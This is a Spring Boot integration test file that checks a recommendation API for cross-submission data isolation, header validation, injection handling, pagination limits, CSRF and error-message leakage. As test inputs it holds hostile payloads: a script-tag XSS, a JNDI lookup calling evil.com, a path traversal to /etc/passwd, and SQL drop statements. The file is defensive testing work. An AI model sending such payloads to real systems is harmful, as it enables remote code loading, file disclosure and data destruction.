package com.allianz.agcs.riskassessment.security;

import com.allianz.agcs.riskassessment.models.rest.request.RecommendationListFilterRequest;
import com.allianz.agcs.riskassessment.models.rest.request.aggrid.FilterItemRequest;
import com.allianz.agcs.riskassessment.models.rest.responses.SearchRecommendationResponse;
import com.allianz.agcs.riskassessment.types.FilterOperatorType;
import com.allianz.agcs.riskassessment.types.FilterType;
import com.allianz.agcs.riskassessment.types.RecommendationListFilterField;
import com.allianz.agcs.riskassessmentcommon.models.entities.recomendation.ArcRecommendationEntity;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.test.web.client.TestRestTemplate;
import org.springframework.boot.test.web.server.LocalServerPort;
import org.springframework.data.mongodb.core.MongoTemplate;
import org.springframework.http.*;
import org.springframework.test.context.DynamicPropertyRegistry;
import org.springframework.test.context.DynamicPropertySource;
import org.testcontainers.containers.MongoDBAtlasLocalContainer;
import org.testcontainers.junit.jupiter.Container;
import org.testcontainers.junit.jupiter.Testcontainers;
import org.testcontainers.utility.DockerImageName;

import java.math.BigDecimal;
import java.time.LocalDate;
import java.util.List;
import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * CRITICAL MISSING TEST: Security Integration Tests
 * 
 * Tests security aspects of the recommendation system:
 * - Submission-based authorization and data isolation
 * - Cross-submission data access prevention
 * - Input validation and injection prevention
 * - Authentication and authorization flows
 * - Security headers and CORS
 */
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
@Testcontainers
class RecommendationSecurityIntegrationTest {

    @LocalServerPort
    private int port;

    @Container
    static MongoDBAtlasLocalContainer mongoContainer = new MongoDBAtlasLocalContainer(
            DockerImageName.parse("mongodb/mongodb-atlas-local:7.0.9")
    );

    @Autowired
    private TestRestTemplate restTemplate;

    @Autowired
    private MongoTemplate mongoTemplate;

    @Autowired
    private ObjectMapper objectMapper;

    private String baseUrl;
    private final String SUBMISSION_A = "SUBA123456.1.0";
    private final String SUBMISSION_B = "SUBB789012.1.0";
    private final String SUBMISSION_C = "SUBC345678.1.0";

    @DynamicPropertySource
    static void configureProperties(DynamicPropertyRegistry registry) {
        registry.add("spring.data.mongodb.uri", mongoContainer::getConnectionString);
        registry.add("spring.data.mongodb.database", () -> "test_recommendations_security");
    }

    @BeforeEach
    void setUp() {
        baseUrl = "http://localhost:" + port + "/api/arcRecommendation";
        
        // Clear existing data
        mongoTemplate.getCollection("arcRecommendation").drop();
        
        // Create test data for multiple submissions
        createMultiSubmissionTestData();
    }

    @Test
    void shouldOnlyReturnRecommendationsForAuthorizedSubmission() {
        // Given
        RecommendationListFilterRequest request = createBasicSearchRequest();
        HttpEntity<RecommendationListFilterRequest> entity = createRequestWithSubmission(request, SUBMISSION_A);

        // When
        ResponseEntity<SearchRecommendationResponse> response = restTemplate.postForEntity(
            baseUrl + "/list", 
            entity, 
            SearchRecommendationResponse.class
        );

        // Then
        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
        assertThat(response.getBody()).isNotNull();
        assertThat(response.getBody().getRows())
            .isNotEmpty()
            .allMatch(rec -> rec.getRecommendationTitle().contains("Submission A"));
    }

    @Test
    void shouldPreventCrossSubmissionDataAccess() {
        // Given - Request with Submission A credentials
        RecommendationListFilterRequest request = createBasicSearchRequest();
        HttpEntity<RecommendationListFilterRequest> entity = createRequestWithSubmission(request, SUBMISSION_A);

        // When
        ResponseEntity<SearchRecommendationResponse> response = restTemplate.postForEntity(
            baseUrl + "/list", 
            entity, 
            SearchRecommendationResponse.class
        );

        // Then - Should not return data from Submission B or C
        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
        assertThat(response.getBody()).isNotNull();
        assertThat(response.getBody().getRows())
            .isNotEmpty()
            .noneMatch(rec -> rec.getRecommendationTitle().contains("Submission B"))
            .noneMatch(rec -> rec.getRecommendationTitle().contains("Submission C"));
    }

    @Test
    void shouldRejectRequestsWithoutSubmissionIdHeader() {
        // Given - Request without submission-id header
        RecommendationListFilterRequest request = createBasicSearchRequest();
        
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_JSON);
        // No submission-id header
        
        HttpEntity<RecommendationListFilterRequest> entity = new HttpEntity<>(request, headers);

        // When
        ResponseEntity<String> response = restTemplate.postForEntity(
            baseUrl + "/list", 
            entity, 
            String.class
        );

        // Then
        assertThat(response.getStatusCode()).isIn(
            HttpStatus.BAD_REQUEST, 
            HttpStatus.UNAUTHORIZED, 
            HttpStatus.FORBIDDEN
        );
    }

    @Test
    void shouldRejectRequestsWithInvalidSubmissionIdFormat() {
        // Given - Request with malformed submission-id
        RecommendationListFilterRequest request = createBasicSearchRequest();
        
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_JSON);
        headers.set("submission-id", "INVALID_FORMAT"); // Invalid format
        
        HttpEntity<RecommendationListFilterRequest> entity = new HttpEntity<>(request, headers);

        // When
        ResponseEntity<String> response = restTemplate.postForEntity(
            baseUrl + "/list", 
            entity, 
            String.class
        );

        // Then
        assertThat(response.getStatusCode()).isIn(
            HttpStatus.BAD_REQUEST, 
            HttpStatus.UNAUTHORIZED, 
            HttpStatus.FORBIDDEN
        );
    }

    @Test
    void shouldPreventNoSQLInjectionInTextFilters() {
        // Given - Request with potential NoSQL injection in text filter
        FilterItemRequest textFilter = FilterItemRequest.builder()
            .filterType(FilterType.TEXT)
            .type(FilterOperatorType.CONTAINS)
            .filter("'; DROP TABLE recommendations; --")
            .build();

        RecommendationListFilterRequest request = new RecommendationListFilterRequest();
        request.setStartRow(0);
        request.setEndRow(10);
        request.setSortModel(List.of());
        request.setFilterModel(Map.of(
            RecommendationListFilterField.RECOMMENDATION_TITLE, textFilter
        ));

        HttpEntity<RecommendationListFilterRequest> entity = createRequestWithSubmission(request, SUBMISSION_A);

        // When & Then - Should not throw error and not compromise database
        ResponseEntity<SearchRecommendationResponse> response = restTemplate.postForEntity(
            baseUrl + "/list", 
            entity, 
            SearchRecommendationResponse.class
        );

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
        assertThat(response.getBody()).isNotNull();
        
        // Verify database integrity - data should still exist
        List<ArcRecommendationEntity> allRecs = mongoTemplate.findAll(ArcRecommendationEntity.class);
        assertThat(allRecs).isNotEmpty(); // Database should not be compromised
    }

    @Test
    void shouldSanitizeSpecialCharactersInSearchInput() {
        // Given - Request with various special characters
        String[] maliciousInputs = {
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/a}",
            "../../etc/passwd",
            "'; DROP DATABASE; --",
            "%00%0a%0d",
            "\u0000\u000a\u000d"
        };

        for (String maliciousInput : maliciousInputs) {
            FilterItemRequest textFilter = FilterItemRequest.builder()
                .filterType(FilterType.TEXT)
                .type(FilterOperatorType.CONTAINS)
                .filter(maliciousInput)
                .build();

            RecommendationListFilterRequest request = new RecommendationListFilterRequest();
            request.setStartRow(0);
            request.setEndRow(10);
            request.setSortModel(List.of());
            request.setFilterModel(Map.of(
                RecommendationListFilterField.RECOMMENDATION_TITLE, textFilter
            ));

            HttpEntity<RecommendationListFilterRequest> entity = createRequestWithSubmission(request, SUBMISSION_A);

            // When & Then - Should handle gracefully without errors
            ResponseEntity<SearchRecommendationResponse> response = restTemplate.postForEntity(
                baseUrl + "/list", 
                entity, 
                SearchRecommendationResponse.class
            );

            assertThat(response.getStatusCode())
                .as("Failed for input: " + maliciousInput)
                .isEqualTo(HttpStatus.OK);
        }
    }

    @Test
    void shouldPreventRecommendationDetailAccessAcrossSubmissions() {
        // Given - Try to access recommendation from different submission
        String submissionBRecommendationId = "67890abcdef1234567890888"; // From Submission B
        
        HttpHeaders headers = new HttpHeaders();
        headers.set("submission-id", SUBMISSION_A); // Using Submission A credentials
        
        HttpEntity<Void> entity = new HttpEntity<>(headers);

        // When
        ResponseEntity<String> response = restTemplate.exchange(
            baseUrl + "/" + submissionBRecommendationId,
            HttpMethod.GET,
            entity,
            String.class
        );

        // Then - Should not be able to access recommendation from different submission
        assertThat(response.getStatusCode()).isIn(
            HttpStatus.NOT_FOUND, 
            HttpStatus.FORBIDDEN, 
            HttpStatus.UNAUTHORIZED
        );
    }

    @Test
    void shouldValidatePaginationParametersToPreventDoSAttacks() {
        // Given - Request with extremely large pagination values
        RecommendationListFilterRequest request = new RecommendationListFilterRequest();
        request.setStartRow(0);
        request.setEndRow(Integer.MAX_VALUE); // Potential DoS attack
        request.setSortModel(List.of());
        request.setFilterModel(Map.of());

        HttpEntity<RecommendationListFilterRequest> entity = createRequestWithSubmission(request, SUBMISSION_A);

        // When
        ResponseEntity<String> response = restTemplate.postForEntity(
            baseUrl + "/list", 
            entity, 
            String.class
        );

        // Then - Should either reject or limit the request
        assertThat(response.getStatusCode()).isIn(
            HttpStatus.OK, 
            HttpStatus.BAD_REQUEST
        );
        
        // If OK, response should be limited
        if (response.getStatusCode() == HttpStatus.OK) {
            // Should not return excessive data
            assertThat(response.getBody().length()).isLessThan(10_000_000); // 10MB limit
        }
    }

    @Test
    void shouldRateLimitExcessiveRequests() throws InterruptedException {
        // Given - Multiple rapid requests from same source
        RecommendationListFilterRequest request = createBasicSearchRequest();
        HttpEntity<RecommendationListFilterRequest> entity = createRequestWithSubmission(request, SUBMISSION_A);

        int successCount = 0;
        int tooManyRequestsCount = 0;

        // When - Make many rapid requests
        for (int i = 0; i < 20; i++) {
            ResponseEntity<String> response = restTemplate.postForEntity(
                baseUrl + "/list", 
                entity, 
                String.class
            );
            
            if (response.getStatusCode() == HttpStatus.OK) {
                successCount++;
            } else if (response.getStatusCode() == HttpStatus.TOO_MANY_REQUESTS) {
                tooManyRequestsCount++;
            }
            
            Thread.sleep(50); // Small delay between requests
        }

        // Then - Should either allow all (no rate limiting) or apply rate limiting
        assertThat(successCount + tooManyRequestsCount).isEqualTo(20);
        // If rate limiting is implemented, some requests should be rejected
        // If not implemented, all should succeed (this test documents the current state)
    }

    @Test
    void shouldPreventCSRFAttacks() {
        // Given - Request without proper CSRF token (if implemented)
        RecommendationListFilterRequest request = createBasicSearchRequest();
        
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_JSON);
        headers.set("submission-id", SUBMISSION_A);
        headers.set("Origin", "http://malicious-site.com"); // Different origin
        
        HttpEntity<RecommendationListFilterRequest> entity = new HttpEntity<>(request, headers);

        // When
        ResponseEntity<String> response = restTemplate.postForEntity(
            baseUrl + "/list", 
            entity, 
            String.class
        );

        // Then - Should handle CSRF protection (implementation dependent)
        assertThat(response.getStatusCode()).isIn(
            HttpStatus.OK, // If CSRF protection not implemented
            HttpStatus.FORBIDDEN // If CSRF protection implemented
        );
    }

    @Test
    void shouldEnforceHTTPSInProduction() {
        // Given - This test documents that HTTPS should be enforced in production
        // Note: In test environment, we typically use HTTP
        
        // When making request to HTTP endpoint
        RecommendationListFilterRequest request = createBasicSearchRequest();
        HttpEntity<RecommendationListFilterRequest> entity = createRequestWithSubmission(request, SUBMISSION_A);

        ResponseEntity<SearchRecommendationResponse> response = restTemplate.postForEntity(
            baseUrl + "/list", 
            entity, 
            SearchRecommendationResponse.class
        );

        // Then - In test environment, HTTP is allowed
        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
        
        // TODO: In production, implement redirect from HTTP to HTTPS
        // and reject insecure HTTP requests
    }

    @Test
    void shouldNotLeakSensitiveInformationInErrorResponses() {
        // Given - Request that will cause an error
        String malformedJson = "{ \"invalid\": json structure without closing brace";
        
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_JSON);
        headers.set("submission-id", SUBMISSION_A);
        
        HttpEntity<String> entity = new HttpEntity<>(malformedJson, headers);

        // When
        ResponseEntity<String> response = restTemplate.postForEntity(
            baseUrl + "/list", 
            entity, 
            String.class
        );

        // Then - Error response should not leak sensitive information
        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.BAD_REQUEST);
        assertThat(response.getBody())
            .doesNotContain("password")
            .doesNotContain("secret")
            .doesNotContain("key")
            .doesNotContain("token")
            .doesNotContain("mongodb://")
            .doesNotContain("localhost")
            .doesNotContain("stacktrace");
    }

    // Helper Methods

    private void createMultiSubmissionTestData() {
        List<ArcRecommendationEntity> testData = List.of(
            // Submission A data
            createRecommendation("67890abcdef1234567890111", "REC_A_001", "Fire Safety - Submission A", "SUBA123456"),
            createRecommendation("67890abcdef1234567890222", "REC_A_002", "Sprinkler System - Submission A", "SUBA123456"),
            createRecommendation("67890abcdef1234567890333", "REC_A_003", "Emergency Exit - Submission A", "SUBA123456"),
            
            // Submission B data
            createRecommendation("67890abcdef1234567890444", "REC_B_001", "Fire Safety - Submission B", "SUBB789012"),
            createRecommendation("67890abcdef1234567890555", "REC_B_002", "Sprinkler System - Submission B", "SUBB789012"),
            createRecommendation("67890abcdef1234567890888", "REC_B_003", "Emergency Exit - Submission B", "SUBB789012"),
            
            // Submission C data
            createRecommendation("67890abcdef1234567890666", "REC_C_001", "Fire Safety - Submission C", "SUBC345678"),
            createRecommendation("67890abcdef1234567890777", "REC_C_002", "Sprinkler System - Submission C", "SUBC345678")
        );

        testData.forEach(mongoTemplate::save);
    }

    private ArcRecommendationEntity createRecommendation(String id, String recId, String title, String submissionBaseNr) {
        ArcRecommendationEntity entity = new ArcRecommendationEntity();
        entity.setId(id);
        entity.setRecommendationId(recId);
        entity.setRecommendationTitle(title);
        entity.setRecommendationBody("Detailed description for " + title);
        entity.setRecommendationType("PHYSICAL");
        entity.setRecommendationCategory("AUTOMATIC_SPRINKLERS");
        entity.setRecommendationPriority("HIGH_PRIORITY");
        entity.setRecommendationStatus("OPEN");
        entity.setSubmissionBaseNr(submissionBaseNr);
        entity.setSubmissionId(submissionBaseNr + ".1.0");
        entity.setObjectId("OBJ_" + recId);
        entity.setObjectName("Test Object " + recId);
        entity.setRcId("RC_" + recId);
        entity.setLossEstimateBeforeValue(new BigDecimal("100000"));
        entity.setLossEstimateAfterValue(new BigDecimal("25000"));
        entity.setCurrency("EUR");
        entity.setDueDate(LocalDate.now().plusMonths(6));
        
        return entity;
    }

    private RecommendationListFilterRequest createBasicSearchRequest() {
        RecommendationListFilterRequest request = new RecommendationListFilterRequest();
        request.setStartRow(0);
        request.setEndRow(10);
        request.setSortModel(List.of());
        request.setFilterModel(Map.of());
        return request;
    }

    private HttpEntity<RecommendationListFilterRequest> createRequestWithSubmission(
            RecommendationListFilterRequest request, String submissionId) {
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_JSON);
        headers.set("submission-id", submissionId);
        
        return new HttpEntity<>(request, headers);
    }
}